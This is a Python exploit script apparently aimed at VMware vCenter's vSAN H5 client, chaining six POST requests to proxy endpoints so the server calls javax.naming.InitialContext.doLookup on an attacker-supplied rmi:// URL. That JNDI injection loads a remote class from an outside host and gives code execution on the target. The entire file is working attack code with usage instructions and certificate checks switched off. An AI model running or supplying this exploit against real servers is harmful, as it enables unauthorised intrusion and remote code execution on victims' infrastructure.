import sys
from urllib.parse import urlparse
import json
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {"Content-Type": "application/json"}


def payload1(url):
    print ("[*] Step 1 setTargetObject to null ...")
    target = url + "/setTargetObject"
    data = {"methodInput":[None]}
    r = requests.post(target, data = json.dumps(data), headers = headers, verify = False)
    if "result" in r.json():
        print(r.text)
        payload2(url)
    else:
        print ("[-] Send payload failed!")


def payload2(url):
    print("[*] Step 2 setStaticMethod to payload ...")
    target = url + "/setStaticMethod"
    data = {"methodInput": ["javax.naming.InitialContext.doLookup"]}
    r = requests.post(target, data = json.dumps(data), headers = headers, verify = False)
    if "result" in r.json():
        print(r.text)
        payload3(url)
    else:
        print ("[-] Send payload failed!")

def payload3(url):
    print("[*] Step 3 setTargetMethod to doLookup ...")
    target = url + "/setTargetMethod"
    data = {"methodInput": ["doLookup"]}
    r = requests.post(target, data = json.dumps(data), headers = headers, verify = False)
    if "result" in r.json():
        print(r.text)
        payload4(url)
    else:
        print ("[-] Send payload failed!")

def payload4(url):
    print("[*] Step 4 setArguments with payload args ...")
    target = url + "/setArguments"
    data = {"methodInput": [[rmi_class]]}
    r = requests.post(target, data = json.dumps(data), headers = headers, verify = False)
    if "result" in r.json():
        print(r.text)
        payload5(url)
    else:
        print ("[-] Send payload failed!")

def payload5(url):
    print("[*] Step 5 initial payload class and methods ...")
    target = url + "/prepare"
    data = {"methodInput": []}
    r = requests.post(target, data = json.dumps(data), headers = headers, verify = False)
    if "result" in r.json():
        print(r.text)
        payload6(url)
    else:
        print ("[-] Send payload failed!")

def payload6(url):
    print("[*] Step 6 trigger method invoke ...")
    target = url + "/invoke"
    data = {"methodInput": []}
    r = requests.post(target, data = json.dumps(data), headers = headers, verify = False)
    print(r.text)
    print("[+] send payload success ^^")
    print()
    print("DONE!")

if __name__ == '__main__':
    try:
        attack_type = sys.argv[1]
        target = sys.argv[2]
        rmi_class = sys.argv[3]
        url = urlparse(target)
        target = url.scheme + "://" + url.netloc
        if(attack_type == 1):
            target = target + "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper"
        else:
            target = target + "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService"
        payload1(target)
    except:
        print("Example: \n\tpython3 " + sys.argv[
            0] + " <target_type> <target> <rmi://ip/class>\n")
        print("\t<target_type>: ")
        print("\t1 - vsanProviderUtils_setVmodlHelper")
        print("\t2 - vsanQueryUtil_setDataService")


